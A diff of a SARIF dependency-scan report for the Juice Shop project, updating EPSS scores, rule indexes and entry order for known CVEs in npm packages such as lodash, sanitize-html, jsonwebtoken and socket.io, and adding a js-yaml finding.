-            "text": "  Vulnerability   : CVE-2017-16016               \n  Severity        : MEDIUM                       \n  Package         : pkg:npm/sanitize-html@1.4.2  \n  Affected range  : <=1.11.1                     \n  Fixed version   : 1.11.4                       \n  EPSS Score      : 0.002860                     \n  EPSS Percentile : 0.519000                     \n"
+            "text": "  Vulnerability   : CVE-2017-16016               \n  Severity        : MEDIUM                       \n  Package         : pkg:npm/sanitize-html@1.4.2  \n  Affected range  : <=1.11.1                     \n  Fixed version   : 1.11.4                       \n  EPSS Score      : 0.002860                     \n  EPSS Percentile : 0.517000                     \n"
           },
           "locations": [
             {
@@ -1586,25 +1612,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-23541                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.1.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 5.0                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.000490                                      \n  EPSS Percentile : 0.149850                                      \n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "/juice-shop/node_modules/express-jwt/node_modules/jsonwebtoken/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CVE-2022-23541",
-          "ruleIndex": 9,
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "  Vulnerability   : CVE-2022-23541                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.4.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 5.0                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.000490                                      \n  EPSS Percentile : 0.149850                                      \n"
+            "text": "  Vulnerability   : CVE-2022-23541                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.4.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 5.0                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.000520                                      \n  EPSS Percentile : 0.160640                                      \n"
           },
           "locations": [
             {
@@ -1617,12 +1625,30 @@
           ]
         },
         {
+          "ruleId": "CVE-2022-23541",
+          "ruleIndex": 9,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2022-23541                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.1.0                    \n  Affected range  : <=8.5.1                                       \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 5.0                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.000520                                      \n  EPSS Percentile : 0.160640                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/juice-shop/node_modules/express-jwt/node_modules/jsonwebtoken/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
           "ruleId": "CVE-2021-26539",
           "ruleIndex": 10,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2021-26539                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.3.1                                        \n  Fixed version   : 2.3.1                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.002880                                      \n  EPSS Percentile : 0.521280                                      \n"
+            "text": "  Vulnerability   : CVE-2021-26539                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.3.1                                        \n  Fixed version   : 2.3.1                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.002880                                      \n  EPSS Percentile : 0.519400                                      \n"
           },
           "locations": [
             {
@@ -1640,7 +1666,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2021-26540                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.3.2                                        \n  Fixed version   : 2.3.2                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.002880                                      \n  EPSS Percentile : 0.521280                                      \n"
+            "text": "  Vulnerability   : CVE-2021-26540                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.3.2                                        \n  Fixed version   : 2.3.2                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.002880                                      \n  EPSS Percentile : 0.519400                                      \n"
           },
           "locations": [
             {
@@ -1658,7 +1684,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2021-32822                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/hbs@4.2.0                             \n  Affected range  : >=0                                           \n  Fixed version   : not fixed                                     \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N  \n  EPSS Score      : 0.002990                                      \n  EPSS Percentile : 0.529750                                      \n"
+            "text": "  Vulnerability   : CVE-2021-32822                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/hbs@4.2.0                             \n  Affected range  : >=0                                           \n  Fixed version   : not fixed                                     \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N  \n  EPSS Score      : 0.002990                                      \n  EPSS Percentile : 0.528040                                      \n"
           },
           "locations": [
             {
@@ -1676,7 +1702,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-33987                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/got@8.3.2                             \n  Affected range  : <11.8.5                                       \n  Fixed version   : 11.8.5                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.007880                                      \n  EPSS Percentile : 0.731600                                      \n"
+            "text": "  Vulnerability   : CVE-2022-33987                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/got@8.3.2                             \n  Affected range  : <11.8.5                                       \n  Fixed version   : 11.8.5                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.007880                                      \n  EPSS Percentile : 0.730960                                      \n"
           },
           "locations": [
             {
@@ -1694,7 +1720,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2023-32313                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <3.9.18                                       \n  Fixed version   : 3.9.18                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.006530                                      \n  EPSS Percentile : 0.701540                                      \n"
+            "text": "  Vulnerability   : CVE-2023-32313                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/vm2@3.9.17                            \n  Affected range  : <3.9.18                                       \n  Fixed version   : 3.9.18                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.005000                                      \n  EPSS Percentile : 0.650780                                      \n"
           },
           "locations": [
             {
@@ -1712,7 +1738,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-21501                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.12.1                                       \n  Fixed version   : 2.12.1                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N  \n  EPSS Score      : 0.013410                                      \n  EPSS Percentile : 0.794240                                      \n"
+            "text": "  Vulnerability   : CVE-2024-21501                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.12.1                                       \n  Fixed version   : 2.12.1                                        \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N  \n  EPSS Score      : 0.021270                                      \n  EPSS Percentile : 0.836090                                      \n"
           },
           "locations": [
             {
@@ -1730,7 +1756,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-4067                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/micromatch@3.1.10                     \n  Affected range  : <4.0.8                                        \n  Fixed version   : 4.0.8                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L  \n  EPSS Score      : 0.001050                                      \n  EPSS Percentile : 0.293100                                      \n"
+            "text": "  Vulnerability   : CVE-2024-4067                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/micromatch@3.1.10                     \n  Affected range  : <4.0.8                                        \n  Fixed version   : 4.0.8                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L  \n  EPSS Score      : 0.001260                                      \n  EPSS Percentile : 0.326740                                      \n"
           },
           "locations": [
             {
@@ -1743,12 +1769,30 @@
           ]
         },
         {
-          "ruleId": "CVE-2020-7598",
+          "ruleId": "CVE-2025-64718",
           "ruleIndex": 17,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2020-7598                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/minimist@0.2.4                        \n  Affected range  : <1.2.2                                        \n  Fixed version   : 1.2.2                                         \n  CVSS Score      : 5.6                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.001550                                      \n  EPSS Percentile : 0.370730                                      \n"
+            "text": "  Vulnerability   : CVE-2025-64718                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/js-yaml@3.14.1                        \n  Affected range  : <3.14.2                                       \n  Fixed version   : 4.1.1                                         \n  CVSS Score      : 5.3                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N  \n  EPSS Score      : 0.000130                                      \n  EPSS Percentile : 0.016180                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/juice-shop/node_modules/js-yaml/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2020-7598",
+          "ruleIndex": 18,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2020-7598                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/minimist@0.2.4                        \n  Affected range  : <1.2.2                                        \n  Fixed version   : 1.2.2                                         \n  CVSS Score      : 5.6                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L  \n  EPSS Score      : 0.002530                                      \n  EPSS Percentile : 0.484410                                      \n"
           },
           "locations": [
             {
@@ -1762,11 +1806,11 @@
         },
         {
           "ruleId": "CVE-2016-1000237",
-          "ruleIndex": 18,
+          "ruleIndex": 19,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2016-1000237                              \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <1.4.3                                        \n  Fixed version   : 1.4.3                                         \n  CVSS Score      : 6.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  \n  EPSS Score      : 0.003280                                      \n  EPSS Percentile : 0.553510                                      \n"
+            "text": "  Vulnerability   : CVE-2016-1000237                              \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <1.4.3                                        \n  Fixed version   : 1.4.3                                         \n  CVSS Score      : 6.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  \n  EPSS Score      : 0.003280                                      \n  EPSS Percentile : 0.551930                                      \n"
           },
           "locations": [
             {
@@ -1780,11 +1824,11 @@
         },
         {
           "ruleId": "CVE-2019-25225",
-          "ruleIndex": 19,
+          "ruleIndex": 20,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2019-25225                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.0.0-beta                                   \n  Fixed version   : 2.0.0-beta                                    \n  CVSS Score      : 6.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  \n  EPSS Score      : 0.000300                                      \n  EPSS Percentile : 0.075360                                      \n"
+            "text": "  Vulnerability   : CVE-2019-25225                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/sanitize-html@1.4.2                   \n  Affected range  : <2.0.0-beta                                   \n  Fixed version   : 2.0.0-beta                                    \n  CVSS Score      : 6.1                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  \n  EPSS Score      : 0.000510                                      \n  EPSS Percentile : 0.159290                                      \n"
           },
           "locations": [
             {
@@ -1798,29 +1842,11 @@
         },
         {
           "ruleId": "CVE-2022-23540",
-          "ruleIndex": 20,
+          "ruleIndex": 21,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-23540                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.4.0                    \n  Affected range  : <9.0.0                                        \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 6.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L  \n  EPSS Score      : 0.000160                                      \n  EPSS Percentile : 0.027030                                      \n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "/juice-shop/node_modules/jsonwebtoken/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CVE-2022-23540",
-          "ruleIndex": 20,
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "  Vulnerability   : CVE-2022-23540                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.1.0                    \n  Affected range  : <9.0.0                                        \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 6.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L  \n  EPSS Score      : 0.000160                                      \n  EPSS Percentile : 0.027030                                      \n"
+            "text": "  Vulnerability   : CVE-2022-23540                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.1.0                    \n  Affected range  : <9.0.0                                        \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 6.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L  \n  EPSS Score      : 0.000170                                      \n  EPSS Percentile : 0.032780                                      \n"
           },
           "locations": [
             {
@@ -1833,12 +1859,30 @@
           ]
         },
         {
-          "ruleId": "CVE-2016-4055",
+          "ruleId": "CVE-2022-23540",
           "ruleIndex": 21,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2016-4055                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/moment@2.0.0                          \n  Affected range  : <2.11.2                                       \n  Fixed version   : 2.11.2                                        \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.013520                                      \n  EPSS Percentile : 0.795300                                      \n"
+            "text": "  Vulnerability   : CVE-2022-23540                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/jsonwebtoken@0.4.0                    \n  Affected range  : <9.0.0                                        \n  Fixed version   : 9.0.0                                         \n  CVSS Score      : 6.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L  \n  EPSS Score      : 0.000170                                      \n  EPSS Percentile : 0.032780                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/juice-shop/node_modules/jsonwebtoken/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2016-4055",
+          "ruleIndex": 22,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "  Vulnerability   : CVE-2016-4055                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/moment@2.0.0                          \n  Affected range  : <2.11.2                                       \n  Fixed version   : 2.11.2                                        \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.038490                                      \n  EPSS Percentile : 0.877110                                      \n"
           },
           "locations": [
             {
@@ -1852,11 +1896,11 @@
         },
         {
           "ruleId": "CVE-2018-3721",
-          "ruleIndex": 22,
+          "ruleIndex": 23,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2018-3721                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.5                                       \n  Fixed version   : 4.17.5                                        \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N  \n  EPSS Score      : 0.001390                                      \n  EPSS Percentile : 0.348320                                      \n"
+            "text": "  Vulnerability   : CVE-2018-3721                                 \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.5                                       \n  Fixed version   : 4.17.5                                        \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N  \n  EPSS Score      : 0.001650                                      \n  EPSS Percentile : 0.379840                                      \n"
           },
           "locations": [
             {
@@ -1870,11 +1914,11 @@
         },
         {
           "ruleId": "CVE-2021-23771",
-          "ruleIndex": 23,
+          "ruleIndex": 24,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2021-23771                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/notevil@1.3.3                         \n  Affected range  : <=1.3.3                                       \n  Fixed version   : not fixed                                     \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N  \n  EPSS Score      : 0.003040                                      \n  EPSS Percentile : 0.533710                                      \n"
+            "text": "  Vulnerability   : CVE-2021-23771                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/notevil@1.3.3                         \n  Affected range  : <=1.3.3                                       \n  Fixed version   : not fixed                                     \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N  \n  EPSS Score      : 0.003040                                      \n  EPSS Percentile : 0.532170                                      \n"
           },
           "locations": [
             {
@@ -1888,11 +1932,11 @@
         },
         {
           "ruleId": "CVE-2022-41940",
-          "ruleIndex": 24,
+          "ruleIndex": 25,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2022-41940                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/engine.io@4.1.2                       \n  Affected range  : >=4.0.0,<6.2.1                                \n  Fixed version   : 6.2.1                                         \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.027790                                      \n  EPSS Percentile : 0.855760                                      \n"
+            "text": "  Vulnerability   : CVE-2022-41940                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/engine.io@4.1.2                       \n  Affected range  : >=4.0.0,<6.2.1                                \n  Fixed version   : 6.2.1                                         \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.024800                                      \n  EPSS Percentile : 0.847770                                      \n"
           },
           "locations": [
             {
@@ -1906,11 +1950,11 @@
         },
         {
           "ruleId": "CVE-2024-28863",
-          "ruleIndex": 25,
+          "ruleIndex": 26,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-28863                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/tar@4.4.19                            \n  Affected range  : <6.2.1                                        \n  Fixed version   : 6.2.1                                         \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.001980                                      \n  EPSS Percentile : 0.422510                                      \n"
+            "text": "  Vulnerability   : CVE-2024-28863                                \n  Severity        : MEDIUM                                        \n  Package         : pkg:npm/tar@4.4.19                            \n  Affected range  : <6.2.1                                        \n  Fixed version   : 6.2.1                                         \n  CVSS Score      : 6.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.002180                                      \n  EPSS Percentile : 0.444040                                      \n"
           },
           "locations": [
             {
@@ -1924,11 +1968,11 @@
         },
         {
           "ruleId": "CVE-2023-32695",
-          "ruleIndex": 26,
+          "ruleIndex": 27,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2023-32695                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:npm/socket.io-parser@4.0.5                                   \n  Affected range  : >=4.0.4,<4.2.3                                                   \n  Fixed version   : 4.2.3                                                            \n  CVSS Score      : 6.9                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.001620                                                         \n  EPSS Percentile : 0.379220                                                         \n"
+            "text": "  Vulnerability   : CVE-2023-32695                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:npm/socket.io-parser@4.0.5                                   \n  Affected range  : >=4.0.4,<4.2.3                                                   \n  Fixed version   : 4.2.3                                                            \n  CVSS Score      : 6.9                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.001620                                                         \n  EPSS Percentile : 0.377040                                                         \n"
           },
           "locations": [
             {
@@ -1942,11 +1986,11 @@
         },
         {
           "ruleId": "CVE-2024-38355",
-          "ruleIndex": 27,
+          "ruleIndex": 28,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "  Vulnerability   : CVE-2024-38355                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:npm/socket.io@3.1.2                                          \n  Affected range  : >=3.0.0,<4.6.2                                                   \n  Fixed version   : 4.6.2                                                            \n  CVSS Score      : 6.9                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.001000                                                         \n  EPSS Percentile : 0.284930                                                         \n"
+            "text": "  Vulnerability   : CVE-2024-38355                                                   \n  Severity        : MEDIUM                                                           \n  Package         : pkg:npm/socket.io@3.1.2                                          \n  Affected range  : >=3.0.0,<4.6.2                                                   \n  Fixed version   : 4.6.2                                                            \n  CVSS Score      : 6.9                                                              \n  CVSS Vector     : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N  \n  EPSS Score      : 0.001360                                                         \n  EPSS Percentile : 0.341060                                                         \n"
           },
           "locations": [
             {
@@ -1960,11 +2004,11 @@
         },
         {
           "ruleId": "CVE-2018-16487",
-          "ruleIndex": 28,
+          "ruleIndex": 29,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2018-16487        \n  Severity        : HIGH                  \n  Package         : pkg:npm/lodash@2.4.2  \n  Affected range  : <4.17.11              \n  Fixed version   : 4.17.11               \n  EPSS Score      : 0.002070              \n  EPSS Percentile : 0.432980              \n"
+            "text": "  Vulnerability   : CVE-2018-16487        \n  Severity        : HIGH                  \n  Package         : pkg:npm/lodash@2.4.2  \n  Affected range  : <4.17.11              \n  Fixed version   : 4.17.11               \n  EPSS Score      : 0.004460              \n  EPSS Percentile : 0.626730              \n"
           },
           "locations": [
             {
@@ -1978,11 +2022,11 @@
         },
         {
           "ruleId": "CVE-2021-23337",
-          "ruleIndex": 29,
+          "ruleIndex": 30,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2021-23337                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.21                                      \n  Fixed version   : 4.17.21                                       \n  CVSS Score      : 7.2                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.003220                                      \n  EPSS Percentile : 0.548670                                      \n"
+            "text": "  Vulnerability   : CVE-2021-23337                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.21                                      \n  Fixed version   : 4.17.21                                       \n  CVSS Score      : 7.2                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  \n  EPSS Score      : 0.007410                                      \n  EPSS Percentile : 0.721720                                      \n"
           },
           "locations": [
             {
@@ -1996,7 +2040,7 @@
         },
         {
           "ruleId": "GHSA-25hc-qcg6-38wj",
-          "ruleIndex": 30,
+          "ruleIndex": 31,
           "kind": "fail",
           "level": "error",
           "message": {
@@ -2014,29 +2058,11 @@
         },
         {
           "ruleId": "CVE-2020-8203",
-          "ruleIndex": 31,
+          "ruleIndex": 32,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2020-8203                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/lodash@2.4.2                          \n  Affected range  : <4.17.20                                      \n  Fixed version   : 4.17.20                                       \n  CVSS Score      : 7.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H  \n  EPSS Score      : 0.019990                                      \n  EPSS Percentile : 0.830590                                      \n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "/juice-shop/node_modules/sanitize-html/node_modules/lodash/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CVE-2020-8203",
-          "ruleIndex": 31,
-          "kind": "fail",
-          "level": "error",
-          "message": {
-            "text": "  Vulnerability   : CVE-2020-8203                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/lodash.set@4.3.2                      \n  Affected range  : >=3.7.0,<=4.3.2                               \n  Fixed version   : not fixed                                     \n  CVSS Score      : 7.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H  \n  EPSS Score      : 0.019990                                      \n  EPSS Percentile : 0.830590                                      \n"
+            "text": "  Vulnerability   : CVE-2020-8203                                 \n  Severity        : HIGH                                          \n  Package         : pkg:npm/lodash.set@4.3.2                      \n  Affected range  : >=3.7.0,<=4.3.2                               \n  Fixed version   : not fixed                                     \n  CVSS Score      : 7.4                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H  \n  EPSS Score      : 0.032760                                      \n  EPSS Percentile : 0.866950                                      \n"
           },
           "locations": [
             {
@@ -2049,12 +2075,30 @@
           ]
         },
         {
-          "ruleId": "CVE-2017-18214",
+          "ruleId": "CVE-2020-8203",
           "ruleIndex": 32,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "  Vulnerability   : CVE-2017-18214                                \n  Severity        : HIGH                                          \n  Package         : pkg:npm/moment@2.0.0                          \n  Affected range  : <2.19.3                                       \n  Fixed version   : 2.19.3                                        \n  CVSS Score      : 7.5                                           \n  CVSS Vector     : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n  EPSS Score      : 0.002430                                      \n  EPSS Percentile : 0.477490                                      \n"
